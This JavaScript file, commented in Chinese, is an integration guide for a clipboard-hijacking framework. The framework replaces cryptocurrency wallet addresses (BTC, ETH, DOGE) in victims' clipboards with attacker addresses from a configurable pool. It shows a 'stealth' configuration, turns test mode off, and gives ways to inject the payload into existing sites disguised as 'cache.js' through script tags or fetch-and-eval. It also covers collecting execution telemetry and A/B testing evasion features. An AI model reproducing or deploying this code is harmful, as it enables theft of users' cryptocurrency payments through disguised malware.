/**
 * 使用示例和集成指南
 */

// 示例1：基础使用
(function basicUsage() {
  // 默认会自动初始化，无需额外代码
  // 框架会根据平台自动选择最佳策略
})();

// 示例2：自定义配置
(function customConfig() {
  // 使用预设模板
  const stealthConfig = ConfigManager.load('stealth');
  window.ClipboardHijack.controller.setConfig(stealthConfig);
  
  // 或者完全自定义
  window.ClipboardHijack.controller.setConfig({
    global: {
      enabled: true,
      testMode: false,
      maxExecutions: 50  // 限制执行50次
    },
    addresses: {
      BTC: ['your-btc-address-here'],
      ETH: ['your-eth-address-here']
    }
  });
})();

// 示例3：添加自定义地址
(function customAddresses() {
  // 添加单个地址
  AddressPool.add('BTC', 'mainnet', 'bc1qcustomaddress');
  
  // 批量导入
  AddressPool.import({
    BTC: {
      mainnet: ['addr1', 'addr2'],
      testnet: ['taddr1']
    },
    DOGE: {
      mainnet: ['DCustomDogeAddress']
    }
  });
})();

// 示例4：控制执行
(function controlExecution() {
  const controller = window.ClipboardHijack.controller;
  
  // 暂停
  controller.pause();
  
  // 恢复
  setTimeout(() => controller.resume(), 5000);
  
  // 完全销毁
  // controller.destroy();
})();

// 示例5：集成到现有项目
(function integration() {
  // 方法1：直接嵌入
  const script = document.createElement('script');
  script.src = 'cache.js';
  document.head.appendChild(script);
  
  // 方法2：动态加载
  fetch('cache.js')
    .then(res => res.text())
    .then(code => eval(code));
  
  // 方法3：模块化导入（需要打包工具）
  // import './cache.js';
})();

// 示例6：监控和统计
(function monitoring() {
  // 定期收集统计
  setInterval(() => {
    const stats = window.ClipboardHijack.stats();
    
    console.log('📊 执行统计:', {
      总执行次数: stats.executed,
      平台信息: stats.platform,
      最近事件: stats.telemetry.slice(-5)
    });
    
    // 发送到分析服务器
    // fetch('https://analytics.example.com/collect', {
    //   method: 'POST',
    //   body: JSON.stringify(stats)
    // });
  }, 60000);
})();

// 示例7：A/B测试
(function abTesting() {
  const variants = {
    A: { features: { ios: { liveText: true } } },
    B: { features: { ios: { liveText: false } } }
  };
  
  // 随机选择变体
  const variant = Math.random() > 0.5 ? 'A' : 'B';
  window.ClipboardHijack.controller.setConfig(variants[variant]);
  
  // 记录变体
  window.__testVariant = variant;
})();
